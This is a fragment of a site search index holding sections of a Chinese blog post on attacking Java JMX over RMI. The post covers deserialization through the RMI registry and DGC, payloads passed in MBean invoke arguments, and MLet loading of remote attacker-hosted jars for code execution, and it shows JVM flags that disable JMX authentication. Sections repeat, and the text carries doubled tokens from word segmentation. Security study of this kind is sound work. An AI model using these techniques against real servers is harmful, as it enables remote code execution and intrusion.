\u4e2d\u5747 \u65e9\u5df2 \u5931\u6548 \u3002 \u9664\u4e86 \u76f4\u63a5 \u653b\u51fb RMI \u5c42 \uff0c \u6211\u4eec \u4e5f \u8fd8 \u53ef\u4ee5 \u5229\u7528 MBean   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \uff0c \u6765 \u4f20\u9012 \u6784\u9020 \u597d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002 \u8fd9\u91cc \u6709\u70b9 \u6709\u70b9\u50cf RMI \u4e2d \u5229\u7528 RMI   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e2d \u5b58\u5728 \u76f8\u5173 \u53ef \u5229\u7528 \u7684 \u5bf9\u8c61 \uff0c \u5982 Object \u7c7b\u578b \u5c31 \u53ef\u4ee5 \u88c5\u8f7d \u6240\u6709 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002   2 .   \u653b\u51fb \u5b58\u5728 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u7684 \u5bf9\u8c61   \u5229\u7528 MBean   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff0c \u6765 \u4f20\u9012 \u6784\u9020 \u597d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002 MBean   Server \u63a5\u6536 \u5230 \u6570\u636e \u540e \uff0c \u4f1a \u5bf9 \u83b7\u53d6 \u5230 \u7684 \u53c2\u6570 \u6570\u636e \u8fdb\u884c   object [ ]   \u8f6c\u6362 \uff0c \u5728 \u8f6c\u6362 \u524d \uff0c \u9700\u8981 \u5c06 RMI \u4ea4\u4e92 \u8fc7\u7a0b \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   javax / management / remote / rmi / RMIConnectionImpl . java # unwrap   1583 \u884c \u8fdb\u884c \u7c7b\u578b \u8f6c\u5316 \uff0c \u4f46 \u9996\u5148 \u9700\u8981 \u5148 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   mo . get ( )   java / rmi / MarshalledObject . java # get   \u8fd9\u91cc \u5c31 \u5230 \u4e86 \u5e38\u89c4 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c   \u6240\u4ee5 \u53ea\u8981 MBean   Server \u91cc \u5b58\u5728 MBean \u7684 \u51fd\u6570 \u5b58\u5728 \u53c2\u6570 \uff0c \u6211\u4eec \u901a\u8fc7 \u6784\u9020 \u76f8\u5173 \u7684 invoke \u4f20\u9012 \u8fc7\u53bb \u5c31 \u53ef\u4ee5 \u89e6\u53d1 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u5982   java . util . logging . Logging # getLoggerLevel ( String )   \u6709 \u4e00\u4e2a String \u7c7b\u578b \u7684 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u5c06 payload \u585e\u8fdb invoke \u7684 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u53c2\u6570 \u5373\u53ef \u3002   \u5176\u4ed6 \u7684 MBean \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fd9\u6837 \u64cd\u4f5c \uff0c \u8fd9\u91cc \u5982\u679c \u9700\u8981 \u8ba4\u8bc1 \u7684\u8bdd \uff0c \u5c31 \u9700\u8981 \u5728 \u8fde\u63a5 \u65f6 \u5c06 \u8ba4\u8bc1 \u4fe1\u606f \u5e26\u4e0a \uff0c \u540e\u7eed \u7684 \u8fd8\u662f \u53ef\u4ee5 \u5229\u7528 \u6210\u529f \u7684 \u3002   3 .   \u5229\u7528 MLET \u65b9\u5f0f \u52a8\u6001 \u52a0\u8f7d MBean   \u8fd9\u91cc \u5148\u8bf4 \u5229\u7528 \u65b9\u5f0f \uff1a   \u5229\u7528 \u6761\u4ef6   \uff1a   \u65e0 security   manager   \u65e0 \u8ba4\u8bc1   \u5229\u7528 \u539f\u7406   \uff1a   \u5728 \u4e00 HTTP   Server \u6302\u8f7d mlet \u6587\u4ef6 \u548c \u5305\u542b MBean \u7684 jar \u6587\u4ef6   \u7528   createMBean ( \" javax . management . loading . MLet \" ,   null ) ;   \u7684 \u65b9\u5f0f \u5728 \u8fdc\u7a0b JMX \u521b\u5efa MLet \u5bf9\u8c61   \u4f7f\u7528   getMBeansFromURL   \u4ece \u8fdc\u7a0b HTTP   Server \u52a0\u8f7d mlet \u6587\u4ef6   \u89e3\u6790 mlet \u6587\u4ef6 \uff0c \u7531\u4e8e \u5b58\u5728 codebase \uff0c \u4ece \u8fdc\u7a0b \u52a0\u8f7d jar \u6587\u4ef6 \uff0c \u5e76 \u8f7d\u5165 \u8be5 MBean   \u8c03\u7528 \u8be5 MBean \u7684 \u65b9\u6cd5 \uff0c \u8fd9\u4e2a \u65b9\u6cd5 \u53ef\u4ee5 \u662f \u81ea\u5b9a \u5b9a\u4e49 \u81ea\u5b9a\u4e49 \u7684 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u7b49 \u64cd\u4f5c   \u7b80\u5355 \u5206\u6790   \uff1a   \u6765 \u7b80\u5355 \u8bf4 \u4e00\u4e0b MLet \u7684 \u539f\u7406 \uff0c JMX \u9664\u4e86 \u52a0\u8f7d \u672c\u5730 \u7684 MBean \uff0c \u4e5f \u53ef\u4ee5 \u52a0\u8f7d \u8fdc\u7a0b \u7684 MLet \u6587\u4ef6 ( \u5305\u542b \u4e86 MLet \u6807\u7b7e ) \u6765 \u52a8\u6001 \u52a0\u8f7d codebase \u91cc \u7684 Jar \u6587\u4ef6 \u3002 \u540e\u8005 \u5c31\u662f \u901a\u8fc7 MLet \u5bf9\u8c61 \u7684 getMBeansFromURL \u51fd\u6570 \u6765 \u5b8c\u6210 \u7684 \u3002   \u6709 \u5174\u8da3 \u7684 \u53ef\u4ee5 \u7ffb\u4e00\u7ffb   javax / management / loading / MLet . java # getMBeansFromURL   \uff0c \u8fd9\u91cc \u76f4\u63a5 \u8bf4 \u4e00\u4e0b \u6d41\u7a0b   \u4ece \u8fdc\u7a0b \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u52a0\u8f7d MLet \u6587\u4ef6 \u5e76 \u89e3\u6790 \u8be5 \u6587\u4ef6   \u6839\u636e MLet \u6587\u4ef6 \u4e2d \u6307\u5b9a \u7684 codebase \u548c archive \u5b57\u6bb5 \uff0c \u62fc\u63a5 \u6210 \u6700\u540e \u8981 \u8bf7\u6c42 \u7684 jar \u6587\u4ef6 URL \u5730\u5740   \u6700\u540e \u7531 URLClassLoader \u6765 \u5b8c\u6210 \u8bf7\u6c42 \u8f7d\u5165 \u64cd\u4f5c   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u7b2c 2 \u6b65\u4e2d \uff0c \u5982\u679c \u5f53\u524d \u7684 URL \u5730\u5740 \u5df2\u7ecf \u5b58\u5728 \u5c06 \u4e0d\u518d \u91cd\u65b0 \u53d1\u8d77 \u8f7d\u5165 \u8bf7\u6c42 \uff0c \u610f\u5473 \u610f\u5473\u7740 \u4e00\u6b21 \u8f7d\u5165 \u6210\u529f \u4e4b\u540e \uff0c \u6211\u4eec \u5c31 \u53ef\u4ee5 \u76f4\u63a5 \u8c03\u7528 \u8be5 MBean \uff08 Server \u4e0d \u91cd\u542f \u7684 \u72b6\u6001 \u4e0b \uff09 \u3002   \u800c \u5bf9\u4e8e \u524d\u9762 \u63d0\u5230 \u7684 \u4e24\u4e2a \u5229\u7528 \u6761\u4ef6 \uff1a   \u5728 \u6587\u6863 \u91cc https : / / docs . oracle . com / javase / 7 / docs / technotes / guides / management / agent . html \u63d0\u5230   Caution   -   This   configuration   is   insecure :   any   remote   user   who   knows   ( or   guesses )   your   port   number   and   host   name   will   be   able   to   monitor   and   control   your   Java   applications   and   platform .   Furthermore ,   possible   harm   is   not   limited   to   the   operations   you   define   in   your   MBeans .   A   remote   client   could   create   a   javax . management . loading . MLet   MBean   and   use   it   to   create   new   MBeans   from   arbitrary   URLs ,   at   least   if   there   is   no   security   manager   .   In   other   words ,   a   rogue   remote   client   could   make   your   Java   application   execute   arbitrary   code .   Consequently ,   while   disabling   security   might   be   acceptable   for   development ,   it   is   strongly   recommended   that   you   do   not   disable   security   for   production   systems   .   \u9996\u5148 \u5bf9\u4e8e \u6709 \u8ba4\u8bc1 \u7684 \u60c5\u51b5 \u4e0b \uff0c \u8c03\u7528 MLet \u5c06\u4f1a \u8fdb\u884c \u6743 \u5f53\u524d \u7528\u6237 \u7684 \u6743\u9650 \u9a8c\u8bc1 \uff0c \u9ed8\u8ba4 \u60c5\u51b5 \u4e0b \u90fd \u662f \u4e0d \u5141\u8bb8 \u7684 \u3002   com / sun / jmx / remote / security / MBeanServerFileAccessController . java # checkAccess   \u4f1a \u68c0\u67e5 \u5f53\u524d \u767b\u9646 \u7684 \u7528\u6237 \u662f\u5426 \u6709 Create \u7684 \u6743\u9650 ( \u8fd9\u91cc \u7684 \u6743\u9650 \u662f \u4e0b\u9762 \u7684 createPatterns \uff0c \u5b83 \u5141\u8bb8 \u521b\u5efa \u6307\u5b9a \u6b63\u5219 \u7684 \u7c7b\u578b \uff0c \u800c \u6211\u4eec \u9ed8\u8ba4 \u662f \u4e3a \u7a7a \u7684 ) \uff0c \u8fd9\u91cc \u9ed8\u8ba4 \u4f1a \u8fd4\u56de false \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u5b83 \u4e0d \u5141\u8bb8 \u4ee5 MLet \u5bf9\u8c61 \u521b\u5efa \u65b0 \u7684 MBean   \u5176\u6b21 \u5bf9\u4e8e security   manager \u7684 \u9650\u5236 \uff0c \u5728 \u8fdc\u7a0b \u8f7d\u5165 \u524d\u4f1a \u5224\u65ad \u662f\u5426 \u5b58\u5728 \u8f7d\u5165 \u7684 \u6743\u9650 \uff08 \u8fd9\u91cc \u6211 \u6ca1 \u770b\u5230 \u5176\u4ed6 \u7684 \u5730\u65b9 \u505a \u4e86 \u5224\u65ad \uff0c \u53ef\u80fd \u4e0d\u6b62 \u5f53\u524d \u8fd9\u4e2a \u4f4d\u7f6e \u7684 \u9a8c\u8bc1 \uff09   \u5f53\u524d \u65b9\u6cd5 \u6bd4\u8f83 \u65b9\u4fbf \u7684 \u662f \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 \u4ee3\u7801 \u6765 \u6267\u884c \uff0c \u4f46\u662f \u5229\u7528 \u6761\u4ef6 \u6bd4\u8f83 \u82db\u523b \u3002   0x03   \u603b\u7ed3   \u5bf9\u4e8e JMX \u7684 \u5229\u7528 \u4e3b\u8981 \u5229\u7528 \u7684 \u662f \u672c\u5730 \u5b58\u5728 \u7684 Gadget \uff0c \u5982\u679c \u672c\u5730 \u4e0d \u5b58\u5728 Gadget \u7684\u8bdd \u5c31 \u65e0\u6cd5 \u5229\u7528 \u6210\u529f \u3002 \u9664\u975e \u6ee1\u8db3 JMX   MLet \u7684 \u5229\u7528 \u6761\u4ef6 \uff0c \u901a\u8fc7 \u52a0\u8f7d codebase \u4e0a \u7684 Jar \u6587\u4ef6 \u6765 \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u7531\u4e8e \u672c\u8eab JMX \u7528 \u7684 RMI \u90a3 \u4e00\u5957 \u4e1c\u897f \uff0c \u6240\u4ee5 \u5982\u679c \u5728 \u5408\u9002 \u7684 JDK \u7248\u672c \u4e0b \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u653b\u51fb RMI \uff0c \u4e0d\u8fc7 \u524d\u63d0 \u4ecd\u7136 \u662f \u672c\u5730 \u5b58\u5728 \u76f8\u5173 \u7684 \u5229\u7528 \u94fe \u3002   \u6700\u540e \uff0c \u524d \u6587 \u63d0\u5230 \u7684 \u653b\u51fb \u65b9\u6cd5 \u6211 \u5df2\u7ecf \u540c\u6b65 \u5230   github   \u4e0a \u4e86","title":"\u653b\u51fb Java   JMX - RMI"},{"location":"blog/2020/java-jmx-rmi-20200310/#0x00","text":"RMI \u7684 \u4e00\u4e2a \u91cd\u8981 \u5e94\u7528 \u662f JMX ( Java   Management   Extentions ) \uff0c \u672c\u6587 \u4ecb\u7ecd JMX \u7684 \u4e24\u4e2a \u653b\u51fb \u653b\u51fb\u9762 \uff1a \uff09","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/java-jmx-rmi-20200310/#0x01","text":"\u5728 \u5199 \u4e00\u534a \u7684 \u65f6\u5019 \uff0c \u53d1\u73b0 \u4e86 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \uff0c \u611f\u89c9 \u5199 \u7684 \u5f88 \u597d \uff0c \u53ef\u4ee5 \u770b\u770b \uff1a https : / / mogwailabs . de / blog / 2019 / 04 / attacking - rmi - based - jmx - services /   JMX   Java   Management   Extensions   ( JMX )   is   a   Java   technology   that   supplies   tools   for   managing   and   monitoring   applications ,   system   objects ,   devices   ( such   as   printers )   and   service - oriented   networks .   MBean   JMX   allows   you   to   manage   resources   as   managed   beans .   A   managed   bean   ( MBean )   is   a   Java   Bean   class   that   follows   certain   design   rules   of   the   JMX   standard .   An   MBean   can   represent   a   device ,   an   application ,   or   any   resource   that   needs   to   be   managed   over   JMX .   You   can   access   these   MBeans   via   JMX ,   query   attributes   and   invoke   Bean   methods .   The   JMX   standard   differs   between   various   MBean   types   however ,   we   will   only   deal   with   the   standard   MBeans   here .   To   be   a   valid   MBean ,   a   Java   class   must :   Implement   an   interface   Provide   a   default   constructor   ( without   any   arguments )   Follow   certain   naming   conventions ,   for   example   implement   getter / setter   methods   to   read / write   attributes   \u8fd9\u91cc \u63d0 \u4e00\u4e0b \uff0c \u5f53 MBean \u7684 \u540d\u5b57 \u4e3a   Hello   \u65f6 \uff0c \u5176 \u76f8\u5e94 \u7684 interface \u540d \u5fc5\u987b \u4e3a   HelloMBean   \uff0c \u4e0d\u7136 \u7b97 \u4e0d \u5408\u6cd5 \u7684 MBean   MBean   Server   A   MBean   server   is   a   service   that   manages   the   MBeans   of   a   system .   Developers   can   register   their   MBeans   in   the   server   following   a   specific   naming   pattern .   The   MBean   server   will   forward   incoming   messages   to   the   registered   MBeans .   The   service   is   also   responsible   to   forward   messages   from   MBeans   to   external   components .   DEMO \u7528 \u53c2\u8003 \u91cc \u7684 \uff0c \u7528   jconsole   \u770b\u770b \u7ed3\u679c   \u5728 JConsole \u91cc \u53ef\u4ee5 \u5bf9 \u5f53\u524d \u6ce8\u518c \u7684 MBean \u8fdb\u884c \u64cd\u4f5c \uff0c \u5982\u4e0a \u4e0a\u56fe \u5982\u4e0a\u56fe \u8c03\u7528   sayHello   \u51fd\u6570   \u5f53\u524d \u6211\u4eec \u8fde \u7684 \u662f \u672c\u5730 \u7684 MBean   Server ( \u6bcf\u4e2a java \u8fdb\u7a0b \u5728 \u672c\u5730 \u90fd \u4f1a \u6709 \u4e00\u4e2a MBean   Server ) \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u5c06 MBean   Server \u6302\u8f7d \u5230 \u67d0 \u4e00 \u7aef\u53e3 \u4e0a \uff0c \u63d0\u4f9b \u8fdc\u7a0b \u7684 MBean \u7ba1\u7406 \u3002   \u8fd0\u884c jar \u65f6 \u5e26\u4e0a   - Dcom . sun . management . jmxremote . port = 2222   - Dcom . sun . management . jmxremote . authenticate = false   - Dcom . sun . management . jmxremote . ssl = false   \u76f4\u63a5 \u901a\u8fc7 JConsole \u6765 \u8fde\u63a5 \uff0c \u4f1a \u63d0\u793a \u4f60 \u6709 \u4e24\u79cd \u65b9\u6cd5 1 :   host : port   ; 2 :   service : jmx : < protocol > : < sap >   \u8fd9\u91cc \u6211\u4eec \u91cd\u70b9 \u8981 \u8bb2 \u7684 \u5c31\u662f \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u6cd5 \uff0c \u9996\u5148 \u6211\u4eec \u5148 \u6765\u770b \u4e00\u4e0b jmx \u5efa\u7acb \u8d77 2222 \u7aef\u53e3 \u540e \uff0c \u7528 nmap \u6765 \u83b7\u53d6 \u5176 \u5185\u5bb9 \u662f \u600e\u4e48 \u600e\u4e48\u6837 \u7684   \u4ece \u7ed3\u679c \u6765\u770b \uff0c JMX \u7684 MBean   Server \u662f \u5efa\u7acb \u5728 RMI \u7684 \u57fa\u7840 \u4e0a \u7684 \uff0c \u5e76\u4e14 \u5176 RMI   Registy \u6ce8\u518c \u7684 \u540d\u5b57 \u53eb   jmxrmi   \u3002   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u6cd5 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u6307\u5b9a \u5177\u4f53 \u7684 \u534f\u8bae \u6765 \u8ddf Server \u7aef \u8fdb\u884c \u8fde\u63a5 \uff0c \u53c2\u8003   JMX   RMI   connector   API   There   are   two   forms   for   RMI   connector   addresses :   In   the   JNDI   form   ,   the   URL   indicates   where   to   find   an   RMI   stub   for   the   connector   .   This   RMI   stub   is   a   Java   object   of   type   RMIServer   that   gives   remote   access   to   the   connector   server .   With   this   address   form ,   the   RMI   stub   is   obtained   from   an   external   directory   entry   included   in   the   URL .   An   external   directory   is   any   directory   recognized   by   JNDI   ,   typically   the   RMI   registry ,   LDAP ,   or   COS   Naming .   In   the   encoded   form   ,   the   URL   directly   includes   the   information   needed   to   connect   to   the   connector   server .   When   using   RMI / JRMP ,   the   encoded   form   is   the   serialized   RMI   stub   for   the   server   object ,   encoded   using   BASE64   without   embedded   newlines .   When   using   RMI / IIOP ,   the   encoded   form   is   the   CORBA   IOR   for   the   server   object .   \u8fd9\u91cc \u7684 encoded   form \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u5b9e\u5728 \u53d1\u8d77 \u7aef \u8fdb\u884c \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4e0d \u8003\u8651 \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u5f62\u5f0f \u3002   \u5bf9\u4e8e JNDI \u7684 \u5f62\u5f0f \uff0c \u6709 \u4ee5\u4e0b \u51e0\u79cd \u65b9\u6cd5 \u8ddf JMX   Server \u53bb \u8fde\u63a5 \uff1a   Connector \u652f\u6301 JRMP \u548c iiop \u4f5c\u4e3a \u8fde\u63a5 \u5c42 \u7684 \u534f\u8bae \uff0c \u6240\u4ee5 \u5bf9\u5e94 \u7684 \u6709 \u4e24\u79cd \u65b9\u5f0f   1 .   service : jmx : rmi : / / host : port /   2 .   service : jmx : iiop : / / host : port /   \u6b64\u5916 \uff0c \u8fd8\u6709 \u57fa\u4e8e \u76ee\u5f55 \u6761 \u76ee\u7684 connectors   1 .   service : jmx : rmi : / / host : port / jndi / jndi - name   2 .   service : jmx : iiop : / / host : port / jndi / jndi - name   \u6bd4\u5982   serivce : jmx : rmi : / / < \u53ef \u5ffd\u7565 \u7684 host > / jndi / rmi : / / host : port / jmxrmi   \u8fd9\u79cd \u65b9\u5f0f \u5c31 \u53ef\u4ee5 \u4f7f\u7528 jndi \u4e0b \u7684 \u6240\u6709 spi \u6765 \u8fdb\u884c \u8fde\u63a5","title":"0x01   \u57fa\u7840"},{"location":"blog/2020/java-jmx-rmi-20200310/#0x02-jmx","text":"","title":"0x02   \u653b\u51fb JMX"},{"location":"blog/2020/java-jmx-rmi-20200310/#1-jmx-rmi","text":"CVE - 2016 - 3427   \u7531\u4e8e JMX \u8ba4\u8bc1 \u65f6 \u4f20\u9012 \u7684 \u662f HashMap \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \uff0c \u800c \u4ee5 HashMap \u53ef\u4ee5 \u76f4\u63a5 \u6784\u9020 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6765 \u653b\u51fb \u672c\u5730 ClassPath \uff0c \u8fd9\u91cc \u5df2\u7ecf \u4fee\u590d \u4e86 \u4e0d\u7ec6 \u8bb2 \u4e86 XD   \u4e3b\u52a8 \u653b\u51fb \u4e3b\u52a8\u653b\u51fb 1   \uff1a \u5229\u7528 RMI   Registy \u6536\u5230 \u8fdc\u7a0b bind \u65f6 \u4ea7\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   jdk < 8u141 _ b10 ( \u5e76\u4e14 check   host \u7684 \u987a\u5e8f \u53d8 \u4e86 \uff0c \u8be6\u7ec6 \u53ef\u4ee5 \u770b   \u8fd9\u91cc   ) \uff0c   8u141 _ b10 \u4fee\u6539 \u540e   SingleEntryRegistry \u589e\u52a0 \u4e86 filter   \u9650\u5236 \u4e86 \u63a5\u53d7 \u5230 \u7684 \u4e0d\u80fd \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u7684 \u5bf9\u8c61 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u4e0d\u80fd \u5229\u7528 registry \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8fbe\u6210 \u5229\u7528 \u4e86 \u3002   \u4e3b\u52a8 \u653b\u51fb \u4e3b\u52a8\u653b\u51fb 2   : \u5229\u7528 RMI   DGC \u5b9e\u73b0 \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u53ef \u5728 JEP   290 \u4e4b\u524d \u7684 \u7248\u672c \u653b\u51fb \u6210\u529f ( \u4f7f\u7528 ysoserial \u7684 JRMPClient \uff0c \u5206\u6790 \u4e5f \u89c1   \u8fd9\u91cc   0x08 \u90e8\u5206 )   \u524d\u9762 \u4e24\u79cd \u65b9\u5f0f \uff0c \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 JDK8 \u4e2d\u5747 \u65e9\u5df2 \u5931\u6548 \u3002 \u9664\u4e86 \u76f4\u63a5 \u653b\u51fb RMI \u5c42 \uff0c \u6211\u4eec \u4e5f \u8fd8 \u53ef\u4ee5 \u5229\u7528 MBean   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \uff0c \u6765 \u4f20\u9012 \u6784\u9020 \u597d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002 \u8fd9\u91cc \u6709\u70b9 \u6709\u70b9\u50cf RMI \u4e2d \u5229\u7528 RMI   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e2d \u5b58\u5728 \u76f8\u5173 \u53ef \u5229\u7528 \u7684 \u5bf9\u8c61 \uff0c \u5982 Object \u7c7b\u578b \u5c31 \u53ef\u4ee5 \u88c5\u8f7d \u6240\u6709 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002","title":"1 .   \u653b\u51fb JMX - RMI"},{"location":"blog/2020/java-jmx-rmi-20200310/#2","text":"\u5229\u7528 MBean   Server \u6302\u8f7d \u7684 \u5bf9\u8c61 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff0c \u6765 \u4f20\u9012 \u6784\u9020 \u597d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u3002 MBean   Server \u63a5\u6536 \u5230 \u6570\u636e \u540e \uff0c \u4f1a \u5bf9 \u83b7\u53d6 \u5230 \u7684 \u53c2\u6570 \u6570\u636e \u8fdb\u884c   object [ ]   \u8f6c\u6362 \uff0c \u5728 \u8f6c\u6362 \u524d \uff0c \u9700\u8981 \u5c06 RMI \u4ea4\u4e92 \u8fc7\u7a0b \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   javax / management / remote / rmi / RMIConnectionImpl . java # unwrap   1583 \u884c \u8fdb\u884c \u7c7b\u578b \u8f6c\u5316 \uff0c \u4f46 \u9996\u5148 \u9700\u8981 \u5148 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   mo . get ( )   java / rmi / MarshalledObject . java # get   \u8fd9\u91cc \u5c31 \u5230 \u4e86 \u5e38\u89c4 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c   \u6240\u4ee5 \u53ea\u8981 MBean   Server \u91cc \u5b58\u5728 MBean \u7684 \u51fd\u6570 \u5b58\u5728 \u53c2\u6570 \uff0c \u6211\u4eec \u901a\u8fc7 \u6784\u9020 \u76f8\u5173 \u7684 invoke \u4f20\u9012 \u8fc7\u53bb \u5c31 \u53ef\u4ee5 \u89e6\u53d1 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316   \u5982   java . util . logging . Logging # getLoggerLevel ( String )   \u6709 \u4e00\u4e2a String \u7c7b\u578b \u7684 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u5c06 payload \u585e\u8fdb invoke \u7684 \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u53c2\u6570 \u5373\u53ef \u3002   \u5176\u4ed6 \u7684 MBean \u4e5f \u540c\u6837 \u53ef\u4ee5 \u8fd9\u6837 \u64cd\u4f5c \uff0c \u8fd9\u91cc \u5982\u679c \u9700\u8981 \u8ba4\u8bc1 \u7684\u8bdd \uff0c \u5c31 \u9700\u8981 \u5728 \u8fde\u63a5 \u65f6 \u5c06 \u8ba4\u8bc1 \u4fe1\u606f \u5e26\u4e0a \uff0c \u540e\u7eed \u7684 \u8fd8\u662f \u53ef\u4ee5 \u5229\u7528 \u6210\u529f \u7684 \u3002","title":"2 .   \u653b\u51fb \u5b58\u5728 \u51fd\u6570\u53c2\u6570 \u7684 \u5bf9\u8c61"},{"location":"blog/2020/java-jmx-rmi-20200310/#3-mletmbean","text":"\u8fd9\u91cc \u5148\u8bf4 \u5229\u7528 \u65b9\u5f0f \uff1a   \u5229\u7528 \u6761\u4ef6   \uff1a   \u65e0 security   manager   \u65e0 \u8ba4\u8bc1   \u5229\u7528 \u539f\u7406   \uff1a   \u5728 \u4e00 HTTP   Server \u6302\u8f7d mlet \u6587\u4ef6 \u548c \u5305\u542b MBean \u7684 jar \u6587\u4ef6   \u7528   createMBean ( \" javax . management . loading . MLet \" ,   null ) ;   \u7684 \u65b9\u5f0f \u5728 \u8fdc\u7a0b JMX \u521b\u5efa MLet \u5bf9\u8c61   \u4f7f\u7528   getMBeansFromURL   \u4ece \u8fdc\u7a0b HTTP   Server \u52a0\u8f7d mlet \u6587\u4ef6   \u89e3\u6790 mlet \u6587\u4ef6 \uff0c \u7531\u4e8e \u5b58\u5728 codebase \uff0c \u4ece \u8fdc\u7a0b \u52a0\u8f7d jar \u6587\u4ef6 \uff0c \u5e76 \u8f7d\u5165 \u8be5 MBean   \u8c03\u7528 \u8be5 MBean \u7684 \u65b9\u6cd5 \uff0c \u8fd9\u4e2a \u65b9\u6cd5 \u53ef\u4ee5 \u662f \u81ea\u5b9a \u5b9a\u4e49 \u81ea\u5b9a\u4e49 \u7684 \u6267\u884c \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 \u7b49 \u64cd\u4f5c   \u7b80\u5355 \u5206\u6790   \uff1a   \u6765 \u7b80\u5355 \u8bf4 \u4e00\u4e0b MLet \u7684 \u539f\u7406 \uff0c JMX \u9664\u4e86 \u52a0\u8f7d \u672c\u5730 \u7684 MBean \uff0c \u4e5f \u53ef\u4ee5 \u52a0\u8f7d \u8fdc\u7a0b \u7684 MLet \u6587\u4ef6 ( \u5305\u542b \u4e86 MLet \u6807\u7b7e ) \u6765 \u52a8\u6001 \u52a0\u8f7d codebase \u91cc \u7684 Jar \u6587\u4ef6 \u3002 \u540e\u8005 \u5c31\u662f \u901a\u8fc7 MLet \u5bf9\u8c61 \u7684 getMBeansFromURL \u51fd\u6570 \u6765 \u5b8c\u6210 \u7684 \u3002   \u6709 \u5174\u8da3 \u7684 \u53ef\u4ee5 \u7ffb\u4e00\u7ffb   javax / management / loading / MLet . java # getMBeansFromURL   \uff0c \u8fd9\u91cc \u76f4\u63a5 \u8bf4 \u4e00\u4e0b \u6d41\u7a0b   \u4ece \u8fdc\u7a0b \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u52a0\u8f7d MLet \u6587\u4ef6 \u5e76 \u89e3\u6790 \u8be5 \u6587\u4ef6   \u6839\u636e MLet \u6587\u4ef6 \u4e2d \u6307\u5b9a \u7684 codebase \u548c archive \u5b57\u6bb5 \uff0c \u62fc\u63a5 \u6210 \u6700\u540e \u8981 \u8bf7\u6c42 \u7684 jar \u6587\u4ef6 URL \u5730\u5740   \u6700\u540e \u7531 URLClassLoader \u6765 \u5b8c\u6210 \u8bf7\u6c42 \u8f7d\u5165 \u64cd\u4f5c   \u8fd9\u91cc \u9700\u8981 \u6ce8\u610f \u7684 \u662f \uff0c \u7b2c 2 \u6b65\u4e2d \uff0c \u5982\u679c \u5f53\u524d \u7684 URL \u5730\u5740 \u5df2\u7ecf \u5b58\u5728 \u5c06 \u4e0d\u518d 